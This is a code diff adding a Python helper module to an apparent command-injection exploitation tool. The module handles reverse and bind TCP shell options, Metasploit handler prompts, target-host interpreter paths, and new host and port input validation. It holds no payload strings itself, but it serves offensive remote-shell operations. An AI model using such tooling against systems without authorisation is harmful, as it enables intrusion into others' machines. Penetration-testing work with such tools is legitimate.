+        err_msg += " If you're confident it's valid, try another injection technique."
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    # Check for invalid provided command.
+    else:
+      err_msg = common.invalid_cmd_output(cmd)
+      settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+
+"""
+Success msg.
+"""
+def shell_success(option):
+  info_msg = "Sending payload to target, for " + option + " TCP connection "
+  if settings.BIND_TCP:
+    info_msg += "against " + settings.RHOST 
+  else:
+    info_msg += "on " + settings.LHOST 
+  info_msg += ":" + settings.LPORT + "."
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+"""
+Payload generation message.
+"""
+def gen_payload_msg(payload):
+  info_msg = "Generating the '" + payload + "' shellcode. "
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  
+"""
+Error msg if the attack vector is available only for Windows targets.
+"""
+def windows_only_attack_vector():
+    error_msg = "This attack vector is available only for Windows targets."
+    settings.print_data_to_stdout(settings.print_error_msg(error_msg))
+
+"""
+Message regarding the MSF handler.
+"""
+def msf_launch_msg(output):
+    info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    info_msg = "Once the loading finishes, press any key here to continue..."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    sys.stdin.readline().replace(settings.END_LINE.LF, "")
+    # Remove the ouput file.
+    os.remove(output)
+
+"""
+Check for available shell options.
+"""
+def shell_options(option):
+  if option.lower() == "reverse_tcp" or option.lower() == "bind_tcp" :
+    warn_msg = "You are in the '" + option.lower() + "' mode."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+  elif option.lower() == "?":
+    menu.reverse_tcp_options()
+  elif option.lower() == "quit" or option.lower() == "exit":
+    raise SystemExit()
+
+  elif option[0:4].lower() == "set ":
+    if option[4:10].lower() == "lhost ":
+      if option.lower() == "bind_tcp":
+        err_msg =  "The '" + option[4:9].upper() + "' option is not "
+        err_msg += "usable for '" + option.lower() + "' mode. Use the 'RHOST' option."
+        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+      else:
+        check_lhost(option[10:])
+    if option[4:10].lower() == "rhost ":
+      if option.lower() == "reverse_tcp":
+        err_msg =  "The '" + option[4:9].upper() + "' option is not "
+        err_msg += "usable for '" + option.lower() + "' mode. Use the 'LHOST' option."
+        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+      else:
+        check_rhost(option[10:])
+    if option.lower() == "reverse_tcp":    
+      if option[4:10].lower() == "lport ":
+        check_lport(option[10:])
+      if option[4:12].lower() == "srvport ":
+        check_srvport(option[12:])
+      if option[4:12].lower() == "uripath ":
+        check_uripath(option[12:])
+  else:
+    return option
+
+"""
+Set up the PHP working directory on the target host.
+"""
+def set_php_working_dir():
+  while True:
+    message = "Do you want to use '" + settings.WIN_PHP_DIR
+    message += "' as PHP working directory on the target host? [Y/n] "
+    php_dir = common.read_input(message, default="Y", check_batch=True)
+    if php_dir in settings.CHOICE_YES:
+      break
+    elif php_dir in settings.CHOICE_NO:
+      message = "Please provide a custom working directory for PHP (e.g. '" + settings.WIN_PHP_DIR + "') "
+      settings.WIN_PHP_DIR = common.read_input(message, default=settings.WIN_PHP_DIR, check_batch=True)
+      settings.USER_DEFINED_PHP_DIR = True
+      break
+    else:
+      common.invalid_option(php_dir)
+      pass
+
+"""
+Set up the Python working directory on the target host.
+"""
+def set_python_working_dir():
+  while True:
+    message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER
+    message += "' as Python interpreter on the target host? [Y/n] "
+    python_dir = common.read_input(message, default="Y", check_batch=True)
+    if python_dir in settings.CHOICE_YES:
+      break
+    elif python_dir in settings.CHOICE_NO:
+      message = "Please specify the full path to the Python interpreter executable (e.g., '" + settings.WIN_CUSTOM_PYTHON_INTERPRETER  + "') "
+      settings.WIN_PYTHON_INTERPRETER = common.read_input(message, default=settings.WIN_CUSTOM_PYTHON_INTERPRETER, check_batch=True)
+      settings.USER_DEFINED_PYTHON_DIR = True
+      break
+    else:
+      common.invalid_option(python_dir)
+      pass
+
+"""
+Check if to use '/bin' standard subdirectory
+"""
+def use_bin_subdir(nc_alternative, shell):
+  while True:
+    message = "Do you want to use '/bin' standard subdirectory? [y/N] "
+    enable_bin_subdir = common.read_input(message, default="N", check_batch=True)
+    if enable_bin_subdir in settings.CHOICE_YES :
+      nc_alternative = "/bin/" + nc_alternative
+      shell = "/bin/" + shell
+      return nc_alternative, shell
+    elif enable_bin_subdir in settings.CHOICE_NO:
+      return nc_alternative, shell
+    elif enable_bin_subdir in settings.CHOICE_QUIT:
+      raise SystemExit()
+    else:
+      common.invalid_option(enable_bin_subdir)
+      pass
+
+"""
+Set up the Python interpreter on linux target host.
+"""
+def set_python_interpreter():
+  while True:
+    message = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
+    message += "' as Python interpreter on the target host? [Y/n] "
+    python_interpreter = common.read_input(message, default="Y", check_batch=True)
+    if python_interpreter in settings.CHOICE_YES:
+      break
+    elif python_interpreter in settings.CHOICE_NO:
+      message = "Please specify the full filesystem path of a custom Python interpreter to use (e.g. '" + settings.LINUX_CUSTOM_PYTHON_INTERPRETER + "') "
+      settings.LINUX_PYTHON_INTERPRETER = common.read_input(message, default=settings.LINUX_CUSTOM_PYTHON_INTERPRETER, check_batch=True)
+      settings.USER_DEFINED_PYTHON_INTERPRETER = True
+      break
+    else:
+      common.invalid_option(python_interpreter)
+      pass
+
+"""
+Every bind/reverse shell payload template hardcodes IPv4 (socket.AF_INET, no bracket syntax), so an IPv6 literal would silently generate a broken payload - reject it instead.
+"""
+def _is_ipv6(value):
+  try:
+    socket.inet_pton(socket.AF_INET6, value)
+    return True
+  except (OSError, socket.error):
+    return False
+
+"""
+Hostnames are allowed, shell metacharacters are not.
+"""
+def _validate_host_or_path(option_name, value):
+  if re.match(r'^[A-Za-z0-9.\-:_/]+$', value) is None:
+    err_msg = "The provided " + option_name + " value contains characters that are not allowed (only letters, digits, '.', '-', ':', '_', '/')."
+    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+    return False
+  if value.isdigit():
+    err_msg = "'" + value + "' looks like a port number, not a valid " + option_name + " host/IP - did you mean to use 'set lport'?"
+    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+    return False
+  if _is_ipv6(value):
+    err_msg = "IPv6 addresses are not currently supported for '" + option_name + "' - use an IPv4 address or hostname."
+    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+    return False
+  return True
+
+"""
+check / set rhost option for bind TCP connection
+"""
+def check_rhost(rhost):
+  if not _validate_host_or_path("RHOST", rhost):
+    return False
+
+  settings.RHOST = rhost
+  settings.print_data_to_stdout("RHOST => " + settings.RHOST)
+  return True
+
+"""
+check / set lhost option for reverse TCP connection
+"""
+def check_lhost(lhost):
+
+  if not _validate_host_or_path("LHOST", lhost):
+    return False
+
+  settings.LHOST = lhost
+  settings.print_data_to_stdout("LHOST => " + settings.LHOST)
+  return True
+
+"""
+Validate a port is a plain base-10 integer within the valid TCP port range (1-65535) - float() alone would silently accept 'nan'/'inf'/negatives/decimals/out-of-range values as a usable port.
+"""
+def _validate_port(port):
+  if re.match(r'^\d+$', port) is None or not (1 <= int(port) <= 65535):
+    err_msg = "The provided port must be numeric and in the 1-65535 range (i.e. 1234)."
+    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+    return False
+  return True
+
+"""
+check / set lport option for reverse TCP connection
+"""
+def check_lport(lport):
+  if not _validate_port(lport):
+    return False
+  settings.LPORT = lport
+  settings.print_data_to_stdout("LPORT => " + settings.LPORT)
+  return True
+
+"""
+check / set srvport option for reverse TCP connection
+"""
+def check_srvport(srvport):
+  if not _validate_port(srvport):
+    return False
+  settings.SRVPORT = srvport
+  settings.print_data_to_stdout("SRVPORT => " + settings.SRVPORT)
+  return True
+
+"""
+check / set uripath option for reverse TCP connection
+"""
+def check_uripath(uripath):
+  settings.URIPATH = uripath
+  settings.print_data_to_stdout("URIPATH => " + settings.URIPATH)
+  return True
+  
+# eof
